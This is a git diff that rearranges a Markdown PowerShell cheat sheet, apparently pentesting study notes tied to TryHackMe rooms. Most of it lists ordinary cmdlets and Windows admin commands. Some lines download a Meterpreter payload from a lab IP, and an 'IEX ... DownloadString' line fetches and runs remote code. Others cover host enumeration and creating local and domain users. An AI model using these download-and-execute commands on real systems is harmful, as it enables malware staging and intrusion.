@@ -1,5 +1,9 @@
 # Powershell
 
+Microsoft has a free course on Introduction to Powershell [here](https://docs.microsoft.com/en-us/learn/modules/introduction-to-powershell/) on their website. Information on [about\_Powershell.exe](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1\&viewFallbackFrom=powershell-7.2).
+
+We can run powershell from the Start Menu by searching for it, through the command prompt by running `powershell.exe`, or through the run dialogbox(`windows key+r`) and running `powershell.exe`
+
 In short, "PowerShell is a cross-platform task automation solution made up of a command-line shell, a scripting language, and a configuration management framework. PowerShell runs on Windows, Linux, and macOS." There is a comprehensive document [here](https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.2), on Microsoft website.
 
 There is also a brief [Introduction to powershell](https://docs.microsoft.com/en-us/learn/modules/introduction-to-powershell/) course.
@@ -7,11 +11,6 @@ There is also a brief [Introduction to powershell](https://docs.microsoft.com/en
 Microsoft has a free course on Introduction to Powershell [here](https://docs.microsoft.com/en-us/learn/modules/introduction-to-powershell/) on their website. Information on [about\_Powershell.exe](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1\&viewFallbackFrom=powershell-7.2).
 
 We can run powershell from the Start Menu by searching for it, through the command prompt by running `powershell.exe`, or through the run dialogbox(`windows key+r`) and running `powershell.exe`
-
-## Commands
-
-* `IEX` OR `Invoke Expression`
-  * The `Invoke-Expression` cmdlet evaluates or runs a specified string as a command and returns the results of the expression or command. Without `Invoke-Expression`, a string submitted at the command line is returned (echoed) unchanged.
 
 ## Arguments
 
@@ -42,40 +41,13 @@ Common verbs:
 
 * Get
 * Start
-* Stop&#x20;
+* Stop
 * Read
 * Write
 * New
 * Out
 
 Full list of approved verbs can be found [here](https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7).
-
-## Commands
-
-* `Get-Help` shows information about a cmdle&#x74;_._ `Get-Help Command-Name`
-* `Get-Command` - Gets all the cmdlets installed on the current Computer. This cmdlet allows for pattern matching such as `Get-Command Verb-*` or `Get-Command *-Noun`
-* `The Pipe( | )` - Used to pass output from one cmdlet to another. Eg. `Verb-Noun | Get-Member`&#x20;
-* `Invoke-Webrequest` - Makes a request to a webserver. Sends HTTP and HTTPS requests to a web page or web service. It parses the response and returns collections of links, images, and other significant HTML elements. More info can be found [here](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2).
-  * Download a file: `Invoke-WebRequest -URI http://(IP):(PORT)/(FILE) -Outfile (FILE)`
-  * `Invoke-WebRequest "URL/File" -OutFile "File"`
-    * `Invoke-WebRequest "http://10.0.2.8/meterpreter-64.ps1" -Outfile "meterpreter.ps1"`
-* `Invoke-Expression` - Evaluates or runs a specified string as a command and returns the results of the expression or command. Without `Invoke-Expression`, a string submitted at the command line is returned (echoed) unchanged.
-* `(New-Object System.Net.WebClient)DownloadFile('URL/File', 'Output-File')`
-  * `(New-Object System.Net.WebClient)DownloadFile('http://10.0.2.8/meterpreter-64.ps1', 'meterpreter.ps1')`
-* `Get-Hotfix` - Enumerate already installed patches
-  * `Get-Hotfix | Format-list | findstr InstalledOn`
-  * `Get-Hotfix | Format-Table HotFixID`
-* `Format-List` - Used to gather more information about objects
-  * `dir | Format-List`
-* `Out-File` - Used to save the output to a file for further use
-  * `Get-Hotfix | Out-File Hotfixes.txt`
-* `Start-Process` - Used to start a process, such as notepad.
-* `Get-Process` - Lists all running processes. Can also be used with the `-name` parameter to filter for a specific process
-* `(command) | Export-Csv` - Exports the Previously piped command into a .CSV file that may be easier to read.
-* `Get-Content` - Shows the contents of a file. Similar to the `cat` command on linux.
-* `Copy-Item` - Copies and item
-* `Move-Item` - Moves and item
-* `Get-FileHash` - Obtains file hash of specified file
 
 ## Arguments
 
@@ -93,14 +65,10 @@ Full list of approved verbs can be found [here](https://docs.microsoft.com/en-us
 
 ## Download files
 
-*   Invoke-WebRequest http://`(IP)`:(PORT)/(FILE) -Outfile (Outputfile)
+`Invoke-Expression` - Evaluates or runs a specified string as a command and returns the results of the expression or command. Without `Invoke-Expression`, a string submitted at the command line is returned (echoed) unchanged.
 
-    * Invoke-WebRequest -URI http://192.168.1.52:8000/test.txt -Outfile Downloaded.txt
-
-
-
-![](<../.gitbook/assets/image (661).png>)
-
+* Invoke-WebRequest http://`(IP)`:(PORT)/(FILE) -Outfile (Outputfile)
+  * Invoke-WebRequest -URI http://192.168.1.52:8000/test.txt -Outfile Downloaded.txt
 * "IEX (New-Object Net.WebClient).DownloadString('URL')"
   * IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.52:8000/test.txt')
 
@@ -112,135 +80,317 @@ Full list of approved verbs can be found [here](https://docs.microsoft.com/en-us
 * .psd1 - Details contents of the Powershell modules in a table of key/value pairs
 * .psm1 - Powershell module file
 
-### List Domain Controllers
+## Commands
+
+* Shows information about a cmdlet;
+
+```
+Get-Help Command-Name
+```
+
+* Get all the cmdlets installed on the current Computer. This cmdlet allows for pattern matching such as `Get-Command Verb-*` or `Get-Command *-Noun`
+
+```
+Get-Command
+```
+
+* `The Pipe( | )` - Used to pass output from one cmdlet to another.
+
+```
+Verb-Noun | Get-Member
+```
+
+* Make a request to a webserver. Sends HTTP and HTTPS requests to a web page or web service. It parses the response and returns collections of links, images, and other significant HTML elements. More info can be found [here](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2).
+
+```
+Invoke-WebRequest -URI http://(IP):(PORT)/(FILE) -Outfile (FILE)
+```
+
+\`
+
+```
+Invoke-WebRequest "http://10.0.2.8/meterpreter-64.ps1" -Outfile "meterpreter.ps1"
+```
+
+```
+(New-Object System.Net.WebClient)DownloadFile('URL/File', 'Output-File')
+```
+
+```
+(New-Object System.Net.WebClient)DownloadFile('http://10.0.2.8/meterpreter-64.ps1', 'meterpreter.ps1')
+```
+
+* Enumerate already installed patches
+
+```
+Get-Hotfix
+```
+
+```
+Get-Hotfix | Format-list | findstr InstalledOn
+```
+
+```
+Get-Hotfix | Format-Table HotFixID
+```
+
+* Gather more information about objects
+
+```
+Format-List
+```
+
+```
+dir | Format-List
+```
+
+* Save the output to a file for further use
+
+```
+Out-File
+```
+
+```
+Get-Hotfix | Out-File Hotfixes.txt
+```
+
+* Start a process, such as notepad.
+
+```
+Start-Process PROCESSNAME
+```
+
+* List all running processes. Can also be used with the `-name` parameter to filter for a specific process
+
+```
+Get-Process
+```
+
+* Export the Previously piped command into a .CSV file that may be easier to read.
+
+```
+(command) | Export-Csv
+```
+
+* Displays the content within a file or object. Similar to the `cat` command on linux.
+
+```
+Get-Content FILE
+```
+
+* Get the hash of a specified file
+
+```
+Get-FileHash
+```
+
+* Show files in current directory
+
+```
+dir
+```
+
+* Show hidden files in current directory
+
+```
+dir /A:H
+```
+
+* Retrieve an object
+
+```
+Get-Item
+```
+
+* Lists out the content of a folder or registry hive.
+
+```
+Get-ChildItem
+```
+
+* Create new objects.
+
+```
+New-Item
+```
+
+* Modify the property values of an object.
+
+```
+Set-Item
+```
+
+* Copy Item
+
+```
+Copy-Item
+```
+
+* Rename item
+
+```
+Rename-Item
+```
+
+* Delete item
+
+```
+Remove-Item
+```
+
+* Append content to a file.
+
+```
+Add-Content
+```
+
+* Overwrite any content in a file with new data.
+
+```
+Set-Content
+```
+
+* Clear the content of the files without deleting the file itself.
+
+```
+Clear-Content
+```
+
+* Compare two or more objects against each other. This includes the object itself and the content within.
+
+```
+Compare-Object
+```
+
+* List Domain Controllers
 
 ```
 netdom query DC
 ```
 
-### View command history
+* View command history
 
 ```
 Get-Histtory # Powershell
 doskey /history # CMD
 ```
 
-### Listing the Contents of the File System
+* Listing the Contents of the File System
 
 ```
 tree
 ```
 
-### Listing the Contents of the File System with files
+* Listing the Contents of the File System with files
 
 ```
 tree /F
 ```
 
-### View file contents
+* View file contents
 
 ```
 Get-Contents FILE
 ```
 
-### General system info
+* General system info
 
 ```
 systeminfo
 ```
 
-### See hosts that have come into contact with our machine
+* See hosts that have come into contact with our machine
 
 ```
 arp /a
 ```
 
-### View current privileges of our user
+* View current privileges of our user
 
 ```
 whoami /priv
 ```
 
-### View groups our user is in
+* View groups our user is in
 
 ```
 whoami /groups
 ```
 
-### View all active services
+* View all active services
 
 ```
 sc query type= service
 ```
 
-### Stop a service
+* Stop a service
 
 ```
 sc stop SERVICE
 ```
 
-### Start a service
+* Start a service
 
 ```
 sc start SERVICE
 ```
 
-### See available modules
+* See available modules
 
 ```
 Get-Module -ListAvailable
 ```
 
-### Import a module
+* Import a module
 
 ```
 Import-Module .\FILE
 ```
 
-### View Execution Policy
+* View Execution Policy
 
 ```
 Get-ExecutionPolicy 
 ```
 
-### Change Execution Polixy
+* Change Execution Polixy
 
 ```
 Set-ExecutionPolicy undefined/restricted/unrestricted/
 ```
 
-### View Local Groups
+* View Local Groups
 
 ```
 get-localgroup
 ```
 
-### View Local Users
+* View Local Users
 
 ```
 Get-LocalUser
 ```
 
-### Adding a new user
+* Adding a new user
 
 ```
 New-LocalUser -Name "USERNAME" -NoPassword
 ```
 
-### Add password to new user
+* Add password to new user
 
 ```
 $Password = Read-Host -AsSecureString
 Set-LocalUser -Name "USERNAME" -Password $Password -Description "DESCRIPTION"
 ```
 
-### Add user to local group
+* Add user to local group
 
 ```
 Add-LocalGroupMember -Group "GROUP" -Member "USERNAME"
 ```
 
-### Download file
+* Download file
 
 ```
 Invoke-WebRequest -Uri "URL" -OutFile "/path/FILENAME"
@@ -249,114 +399,28 @@ Invoke-WebRequest -Uri "URL" -OutFile "/path/FILENAME"
 
 ## AD-Module
 
-### List AD Users
+* List AD Users
 
 ```
 Get-ADUser -Filter *
 Get-ADUser -Identity USERNAME
 ```
 
-### Add new AD user
+* Add new AD user
 
 ```
 New-ADUser -Name "USERNAME" -Surname "LASTAME" -GivenName "FIRSTNAME" -Office "Security" -OtherAttributes @{'mail'="USERNAME@DOMAIN"} -Accountpassword (Read-Host -AsSecureString "AccountPassword") -Enabled $true 
 ```
 
-## Creating/Moving/Deleting Files & Directories
-
-### Show files in current directory
-
-```
-dir
-```
-
-### Show hidden files in current directory
-
-```
-dir /A:H
-```
-
-### Retrieve an object
-
-```
-Get-Item
-```
-
-### Lists out the content of a folder or registry hive.
-
-```
-Get-ChildItem
-```
-
-### Create new objects.
-
-```
-New-Item
-```
-
-Modify the property values of an object.
-
-```
-Set-Item
-```
-
-### Copy Item
-
-```
-Copy-Item
-```
-
-### Rename item
-
-```
-Rename-Item
-```
-
-### Delete item
-
-```
-Remove-Item
-```
-
-### Displays the content within a file or object.
-
-```
-Get-Content
-```
-
-### Append content to a file.
-
-```
-Add-Content
-```
-
-### Overwrite any content in a file with new data.
-
-```
-Set-Content
-```
-
-### Clear the content of the files without deleting the file itself.
-
-```
-Clear-Content
-```
-
-### Compare two or more objects against each other. This includes the object itself and the content within.
-
-```
-Compare-Object
-```
-
 ## Scheduled Tasks
 
-### View currently scheduled tasks
+* View currently scheduled tasks
 
 ```
 SCHTASKS /Query /V /FO list
 ```
 
-### Create Syntax
+* Create Syntax
 
 | **Action**                                                                                            | **Parameter** | **Description**                                                                                                               |
 | ----------------------------------------------------------------------------------------------------- | ------------- | ----------------------------------------------------------------------------------------------------------------------------- |
@@ -376,8 +440,7 @@ SCHTASKS /Query /V /FO list
 * `/sc` : we must set a schedule
 * `/tn` : we must set the name
 * `/tr` : we must give it an action to take
-
-### Change Syntax
+* Change Syntax
 
 | **Action** | **Parameter** | **Description**                                    |
 | ---------- | ------------- | -------------------------------------------------- |
@@ -387,7 +450,7 @@ SCHTASKS /Query /V /FO list
 |            | /ENABLE       | Change the state of the task to Enabled.           |
 |            | /DISABLE      | Change the state of the task to Disabled.          |
 
-### Delete Syntax
+* Delete Syntax
 
 | **Action** | **Parameter** | **Description**                                           |
 | ---------- | ------------- | --------------------------------------------------------- |
@@ -402,4 +465,4 @@ SCHTASKS /Query /V /FO list
 
 [TryHackMe Hacking With Powershell](https://tryhackme.com/room/powershell)
 
-[TryHackme Powershell for Pentesters](https://tryhackme.com/room/powershellforpentesters)
+[TryHackme Powershell](https://tryhackme.com/room/powershellforpentesters)
